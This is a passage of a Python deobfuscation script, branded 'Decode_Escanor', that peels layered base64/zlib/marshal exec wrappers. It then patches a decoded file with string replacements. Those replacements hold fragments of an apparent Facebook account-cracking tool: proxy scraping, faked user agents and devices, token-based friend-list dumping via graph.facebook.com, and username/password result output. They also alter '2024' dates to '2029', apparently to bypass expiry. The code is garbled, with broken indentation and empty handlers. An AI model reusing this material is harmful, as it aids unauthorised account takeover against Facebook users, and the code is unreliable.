	               source='import base64\nexec(base85'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)        
	       if 'exec(zlib' in source:
	           try:
	               source=source.split('exec(zlib')[1].split("'))")[0]
	               source='import zlib\nexec(zlib'+source+"'))"
	               save(source,'w','ou')
	               decoder(la,lo)
	           except IndexError:
	               source=source.split('exec(zlib')[1].split('"))')[0]
	               source='import zlib\nexec(zlib'+source+'"))'             
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(gzip' in source:
	                   try:
	                    source=source.split('exec(gzip')[1].split("'))")[0]
	                    source='import gzip\nexec(gzip'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(gzip')[1].split('"))')[0]
	               source='import gzip\nexec(gzip'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(base64' in source:
	                    try:
	                     source=source.split('exec(base64')[1].split("'))")[0]
	                     source='import base64\nexec(base64'+source+"'))"
	                     save(source,'w','ou')
	                     decoder(la,lo)
	                    except IndexError:
	                     source=source.split('exec(base64')[1].split('"))')[0]
	                    source='import base64\nexec(base64'+source+'"))'
	                    save(source,'w','ou')
	                    decoder(la,lo)
	               if 'exec(lzma' in source:
	                   try:
	                    source=source.split('exec(lzma')[1].split("'))")[0]
	                    source='import lzma\nexec(lzma'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(lzma')[1].split('"))')[0]
	               source='import lzma\nexec(lzma'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(bytes.fromhex' in source:
	                   try:
	                    source=source.split('exec(bytes.fromhex')[1].split("'))")[0]
	                    source='exec(bytes.fromhex'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(bytes.fromhex')[1].split('"))')[0]
	               source='exec(bytes.fromhex'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(_(' in source:
	                   try:
	                    prefix = '''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)('''
	                    suffix = source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(''')[1].split("'))")[0]
	                    source = f"{prefix}{suffix}))"  # إضافة المقدمة واللاحقة إلى التعليمات المشفرة
	                    save(source, 'w', 'ou')
	                    decoder(la, lo)
	                   except IndexError:
	                    prefix = '''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)('''
	                    suffix_index = 1 if source.endswith("')") else 100
	                    suffix = source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(''')[1].split('"))')[0]
	                    source = f"{prefix}{suffix})"  # إضافة المقدمة واللاحقة إلى التعليمات المشفرة
	                    save(source, 'w', 'ou')
	                    decoder(la, lo)
	               if 'exec(_(' in source:
	                   try:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(''')[1].split("'))")[0]
	                    source='''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)('''+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(_(' in source:
	                   try:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(''')[1].split("'))")[0]
	                    source='''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)('''+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(_(' in source:
	                   try:
	                    source=source.split('''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])); exec((_)(''')[1].split("'))")[0]
	                    source='''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])); exec((_)('''+source+"'))"
	                    m = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"+"\n"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])); exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])); exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(_(' in source:
	                   try:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(''')[1].split("'))")[0]
	                    source='''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)('''+source+"'))"
	                    m = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"+"\n"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(_(' in source:
	                   try:
	                    source=source.split('''_ = lambda __ : __import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));
exec((_)(''')[1].split("'))")[0]
	                    source='''_ = lambda __ : __import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));
exec((_)('''+source+"'))"
	                    m = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"+"\n"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('''_ = lambda __ : __import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));
exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));
exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               
	               if 'exec(codecs.decode' in source:
	                   try:
	                    source=source.split('exec(codecs.decode')[1].split("'))")[0]
	                    source='exec(codecs.decode'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(codecs.decode')[1].split('"))')[0]
	               source='exec(codecs.decode'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(gzip.' in source:
	                   try:
	                    source=source.split('exec(codecs.decode')[1].split("'))")[0]
	                    source='exec(codecs.decode'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(codecs.decode')[1].split('"))')[0]
	               source='exec(codecs.decode'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(gzip.decompress(base64.b64decode' in source:
	                   try:
	                    source=source.split('exec(gzip.decompress(base64.b64decode')[1].split("')).decode())")[0]
	                    source='exec(gzip.decompress(base64.b64decode'+source+"')).decode())"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(gzip.decompress(base64.b64decode')[1].split('")).decode())')[0]
	               source='exec(gzip.decompress(base64.b64decode'+source+'")).decode())'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(zlib.decompress' in source:
	                   try:
	                    source=source.split('exec(zlib.decompress')[1].split("')).decode())")[0]
	                    source='import zlib\nexec(zlib.decompress'+source+"')).decode())"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(zlib.decompress')[1].split('")).decode())')[0]
	               source='import zlib\nexec(zlib.decompress'+source+'")).decode())'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(zlib.decompress(base64.b64decode' in source:
	                   try:
	                    source=source.split('exec(zlib.decompress(base64.b64decode')[1].split("'))))")[0]
	                    source='import zlib\nexec(zlib.decompress(base64.b64decode'+source+"')))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(zlib.decompress(base64.b64decode')[1].split('")))')[0]
	               source='import zlib\nexec(zlib.decompress(base64.b64decode'+source+'")))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(marshal.loads(zlib.decompress(base64.b64decode' in source:
	                   try:
	                    source=source.split('exec(marshal.loads(zlib.decompress(base64.b64decode')[1].split("'))).decode())")[0]
	                    source='exec(marshal.loads(zlib.decompress(base64.b64decode'+source+"')).decode())"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(marshal.loads(zlib.decompress(base64.b64decode')[1].split('"))).decode())')[0]
	               source='exec(marshal.loads(zlib.decompress(base64.b64decode'+source+'"))).decode())'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(gzip.' in source:
	                   try:
	                    source=source.split('exec(codecs.decode')[1].split("'))")[0]
	                    source='exec(codecs.decode'+source+"'))"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(codecs.decode')[1].split('"))')[0]
	               source='exec(codecs.decode'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(zlib.decompress(base64.b64decode' in source:
	                   try:
	                    source=source.split('exec(zlib.decompress(base64.b64decode')[1].split("')).decode())")[0]
	                    source='exec(zlib.decompress(base64.b64decode'+source+"')).decode())"
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                   except IndexError:
	                    source=source.split('exec(zlib.decompress(base64.b64decode')[1].split('")).decode())')[0]
	               source='exec(zlib.decompress(base64.b64decode'+source+'")).decode())'
	               save(source,'w','ou')
	               decoder(la,lo)
	               if 'exec(base64' in source:
	                    try:
	                     source=source.split('exec(base64')[1].split("')).decode())")[0]
	                     source='import base64\nexec(base64'+source+"')).decode())"
	                     save(source,'w','ou')
	                     decoder(la,lo)
	                    except IndexError:
	                     source=source.split('exec(base64')[1].split('")).decode())')[0]
	                    source='import base64\nexec(base64'+source+'")).decode())'
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                    if 'exec(zlib' in source:
	                         try:
	                          source=source.split('exec(zlib')[1].split("')).decode())")[0]
	                          source='import zlib\nexec(zlib'+source+"')).decode())"
	                          save(source,'w','ou')
	                          decoder(la,lo)
	                         except IndexError:
	                          source=source.split('exec(zlib')[1].split('")).decode())')[0]
	                    source='import zlib\nexec(zlib'+source+'")).decode())'
	                    save(source,'w','ou')
	                    decoder(la,lo)
	                    if 'exec(zlib.decompress(base64.b64decode' in source:
	                     try:
	                      source=source.split('import base64\nzlib\nexec(zlib.decompress(base64.b64decode')[1].split("')).decode())")[0]
	                      source='import base64\nzlib\nexec(zlib.decompress(base64.b64decode'+source+"')).decode())"
	                      save(source,'w','ou')
	                      decoder(la,lo)
	                     except IndexError:
	                      source=source.split('import base64\nzlib\nexec(zlib.decompress(base64.b64decode')[1].split('")).decode())')[0]
	                     source='import base64\nzlib\nexec(zlib.decompress(base64.b64decode'+source+'")).decode())'
	                     save(source,'w','ou')
	                     decoder(la,lo)
	                    if 'exec(zlib.decompress(base64.b64decode' in source:
	                     try:
	                      source=source.split('import zlib\nexec(zlib.decompress(base64.b64decode')[1].split("'))")[0]
	                      source='import zlib\nexec(zlib.decompress(base64.b64decode'+source+"'))"
	                      save(source,'w','ou')
	                      decoder(la,lo)
	                     except IndexError:
	                      source=source.split('import \nzlib\nexec(zlib.decompress(base64.b64decode')[1].split('"))')[0]
	                     source='import zlib\nexec(zlib.decompress(base64.b64decode'+source+'"))'
	                     save(source,'w','ou')
	                     decoder(la,lo)
	               if 'exec((_)(' in source:
	                      try:
	                       prefix = '''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)('''
	                       suffix = source.split('''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(''')[1].split("'))")[0]
	                       source = f"{prefix}{suffix}))"  # إضافة المقدمة واللاحقة إلى التعليمات المشفرة
	                      except IndexError:
	                        prefix = '''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)('''
	                        suffix = source.split('''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(''')[1].split('"))')[0]
	                        source = f"{prefix}{suffix})"  # إضافة المقدمة واللاحقة إلى التعليمات المشفرة
	                        save(source, 'w', 'ou')
	                        decoder(la, lo)
	               if 'exec((_)(' in source:
	                      try:
	                       source=source.split('''_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(''')[1].split("'))")[0]
	                       source='''_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)('''+source+"'))"
	                       save(source,'w','ou')
	                       decoder(la,lo)
	                      except IndexError:
	                        source=source.split('''_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               	        
	               if 'some_new_encoding(' in source:
	                      try:
	                       source = source.replace('some_new_encoding(', 'another_encoding(')
	                       save(source, 'w', 'ou')
	                       decoder(la, lo)
	                      except Exception as e:
	                       print(f"Error: {e}")       
	               if 'exec((_)(' in source:
	                      try:
	                       source=source.split('''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(''')[1].split("'))")[0]
	                       source='''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)('''+source+"'))"
	                       save(source,'w','ou')
	                       decoder(la,lo)
	                      except IndexError:
	                        source=source.split('''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(''')[1].split('"))')[0]
	               source='''_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)('''+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)	               	               
	       if 'exec(marshal.loads' in source:
	       	if 'eval' in source:
	       		if 'exec(marshal.loads' in source:
	       			Eval_conv(source).en_marsh()
	       		else:
	       			Eval_conv(source).sorce()
	       		
	       	else:
	       		decoder(la,lo)
	     
	       if 'eval(' in source:
	       	if 'exec(marsh' in source:
	       		Eval_conv(source).en_marsh()
	       	
	       	else:
	       		print('eval(')
	       		Eval_conv(source).sorce()
	       if 'bytes([' in source:
	       	if 'exec(marshal' in source:
	       		Byto(source).en_marsh()
	       	else:
	       		bytos(source)
	       if len(source) > 250:
	        m = '''
# DECRYPT By • Coder_Escanor
# Copyright: DEVIL
# Telegram @Coder_Escanor\n'''
	        save(m + source, 'w', 'ou')
	       for _ in range(200):
	        decoder(la, lo)
	       	file=open('Decode_Escanor.py','r').read()
#	       	open('decoded.py','w').write(source)
	       	if 'std::bad_cast' in file:
	       			
	       			exit()
	       	else:
	       			fs=0
	       			for cop in Copyright:
	       				if cop in file:
	       					fs+=1
	       			if fs > 0:
	       				print('')
							
	       			#elif '(lambda' in file:
	       			    #pass
	       			elif fs == 0:
	       				clear_un(file)
	       				la=0
	       				
	       				return 1
	       				pass 
	       				pass
	       				'''
	        if '57]).decode():' in source:
	           pass
	           if 'exec(marshal.loads(' in source:
	           	Byto(source).en_marsh()
	           else:
	           	Byto(source).source()'''
	           
	elif type(source) == CodeType:
	       source: bytes = DecompileMarshal(source).get_source()   
	       save(source,"wb",'ou')
	else:
#	       print(type(source))
	       print('')
	if type(source) == bytes:
		decoder(la,lo)
	if type(source) == str:
		if 'exec(marshal.loads(' in source:
		       decoder(la,lo) 
		       
def save(source,w,typ):
	if typ=='ou':
		open(outo,w).write(source)
	elif typ=='ine':
		open(into,w).write(source)        
import os

def print_decoding_progress(layers_decoded):
    print(f"\033[0mDone Decode Tool Encryption √ {layers_decoded} Layer")
import os
import argparse

import os
import argparse
def print_decoding_progress(layers_decoded):
    print(f"\033[0mDone Decode Tool Encryption √ {layers_decoded} Layer")

def main(na, m):
    global file, into, decode_file, lay, reb, la, outo
    decode_file = 'Decode_Escanor.py'
    outo = decode_file
    lo = 1
    la = layrs
    reb = m
    into = na
    try:
        file = open(into, 'r').read()
        open('Decode_Escanor.py', 'w')
        save(file, 'w', 'ou')
        file = open('Decode_Escanor.py', 'r').read()
        lay = 0
        while 1 > lay:
            lay += 1
            print('انتظر، جار فك التشفير...')
            file = open('Decode_Escanor.py', 'r').read()
            decoder(la, lo='anything')
    except UnicodeDecodeError:
        file = open(into, 'rb').read()
        print('جاري فك تشفير المحتوى الثنائي...')
        decoder(la, lo)
layrs = 1
os.system("clear")
na = input("\033[0;35m[✓1 ]ɒєcσ\x1b[1;94mɒє\033[93m → ")
m = 1
#############
from pathlib import Path
file_path = Path("/storage/emulated/0/BARON/Decode_Escanor.py")
with open(str(file_path), 'r') as file:
    # Your code to read the file goes here
             Devil = file.read()
             Devil = Devil.replace("'''", "'").replace("""foo = False""","").replace("""if foo:
    pass""","").replace("""
                
                try:""","""
                try:""").replace("finally","except").replace("""
                    except:
                        pass""","""
                    except Exception as e:""").replace("""
                except:
                    pass""","""
                except Exception as e:""").replace(""", [
    'cyan','yellow'], 'center', **('colors', 'align'))""",""",colors=['cyan', 'yellow'], align='center')""").replace(""", [
    'white','blue'], 'center', **('colors', 'align'))""",""",colors=['white', 'blue'], align='center')""").replace(""", [
    'red','green'], 'center', **('colors', 'align'))""",""",colors=['red', 'green'], align='center')""").replace(""", ['yellow','blue'], 'left', **('colors', 'align'))""",""",colors=['yellow', 'blue'], align='center')""").replace("""
asu = random.choice([
    m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""","""asu = random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""").replace("""
asu=random.choice([
    m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""","""
asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""").replace("""
proxy = request.ProxyHandler({
    'http': '127.0.0.1:443' })""","""
proxy = request.ProxyHandler({'http': '127.0.0.1:443' })""").replace("""
    except:
        pass""","""
    except Exception as e:""").replace("""2024,""","""2029,""").replace("""
\n\n\n\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n\n\n\n\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n\n\n\n\n""","""
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n""").replace("""2024-""","""2029-""").replace("""
            Z='\x1b[1;31m'""","""
	Z = '\033[1;31m'""").replace("""
prox=open('.prox.txt','r').read().splitlines()

import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
try:
    import rich
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except ImportError:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except ImportError:
print('')""","""
prox=open('.prox.txt','r').read().splitlines()
import requests,sys,os,time
 


try:
        
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
    import requests""").replace("""
okc='OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc='CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

try:
    import requests
except ImportError:
print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n')
os.system('pip install requests')

try:
    import rich
except Exception as e:
print('\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n')
os.system('pip install rich')""","""
okc='OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc='CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'""").replace(""" % tokenku)
    except Exception as e:""","""%(tokenku))
    except:
        pass""").replace("""        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except Exception as e:
    exit(f'\n{M}File %s not found' % fileX)""","""        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except IOError:
    exit(f"\n{M}File %s not found"%(fileX))""").replace("""

try:
    prox=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    print(' ')
except Exception as e:


prox=open('.prox.txt', 'r').read().splitlines()

try:
    prox=requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    pass
except:
    
    


prox=open('.prox.txt', 'r').read().splitlines()

try:
    import rich
except Exception as e:
cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except Exception as e:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except Exception as e:
print('')""","""
try:

 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' ')
prox=open('.prox.txt','r').read().splitlines()

import requests
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os


try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('')""").replace("""

try:
    prox=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:""","""

try:
    prox=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:""").replace("""
proxy = request.ProxyHandler({'http': '127.0.0.1:443' })
request.install_opener(request.build_opener(proxy))

try:
    prox=requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    print(' ')
except Exception as e:


prox=open('.prox.txt', 'r').read().splitlines()

try:
    prox=requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:


try:
    pass
except:
    
    


prox=open('.prox.txt', 'r').read().splitlines()

try:
    import rich
except Exception as e:
cetak(nel('\t• Sedang Menginstall Modul Rich •'))
os.system('pip install rich')

try:
    import stdiomask
except Exception as e:
cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
os.system('pip install stdiomask')

try:
    import requests
except Exception as e:
print('')""","""request.install_opener(request.build_opener(proxy))

try:
 prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' ')
prox=open('.prox.txt','r').read().splitlines()
import requests
try:
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
import webbrowser
import urllib3,rich,base64
from fake_useragent import UserAgent
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('')
""").replace("""
android = random.choice([
    'TECNO',
    'INFINIX',
    'SAMSUNG'])
model = random.choice([
    'LD2',
    'SM-J009',
    'SM-J505',
    'HOT12',
    'NOTE-11',
    'A5-PRO'])
carrier = '' + random.choice([
    '02',
    'Oramge',
    'EE',
    'At&',
    'MTN',
    'Cricket'])""","""    
android = random.choice(['TECNO','INFINIX','SAMSUNG'])
model = random.choice(['LD2','SM-J009','SM-J505','HOT12','NOTE-11','A5-PRO'])
carrier = '' + random.choice(['02','Oramge','EE','At&','MTN','Cricket'])""").replace("""
except:
    pass""","""
except Exception as e:""").replace(""",
            '""",""",'""").replace(""", headers, **('headers',))""",""", headers=headers)""").replace("""
try:
    import rich
except Exception as e:


try:
    import stdiomask
except Exception as e:


try:
    import requests
except Exception as e:
print('')""","""
try:
    import rich
except ImportError:


try:
    import stdiomask
except ImportError:


try:
    import requests
except ImportError:
print('')""").replace("""
        for user in uid:
        
          try:
            uaidcrac = random.choice(ugen)
            head = {
                'user-agent': f'{uaidcrac}' }
            if len(id) == 0:
               params = (
               {
                'access_token': token,
                'fields': "friends"
               }              
           )
            else:
               params = (
               {
                'access_token': token,
                'fields': "friends"
               }               
           )
            url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()""","""
        for user in uid:
        
        try:
            uaidcrac = random.choice(ugen)
            head = {
                'user-agent': f'{uaidcrac}' }
            if len(id) == 0:
               params = (
               {
                'access_token': token,
                'fields': "friends"
               }               
           )
            else:
               params = (
               {
                'access_token': token,
                'fields': "friends"
               }               
           )
           url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()""").replace("""
            url = requests.get('https://graph.facebook.com/{}'.format(user), params, head, {
                'cookies': cok }, **('params', 'headers', 'cookies')).json()""","""
           url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()""").replace("""
                params = {
                    'access_token': token,
                    'fields': 'friends' }""","""
               params = (
               {
                'access_token': token,
                'fields': "friends"
               }               
           )""").replace("""
        IOError""","""
        except IOError:""").replace("""% (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))""","""%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()""").replace("""
     if __name__ == '__main__':    
    try:os.system('git pull')
    except Exception as e:
    try:os.mkdir('OK')
    except Exception as e:
    try:os.mkdir('CP')
    except Exception as e:
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except Exception as e: 
    try:os.system('touch .prox.txt')
    except Exception as e:
    try:os.system('pkg install play-audio')
    except Exception as e:
    try:os.system('clear')
    except Exception as e:
""","""    if __name__ == '__main__':    
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass 
    try:os.system('touch .prox.txt')
    except:pass
    try:os.system('pkg install play-audio')
    except:pass
    try:os.system('clear')
    except:pass
""").replace("""ugen2 = [
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
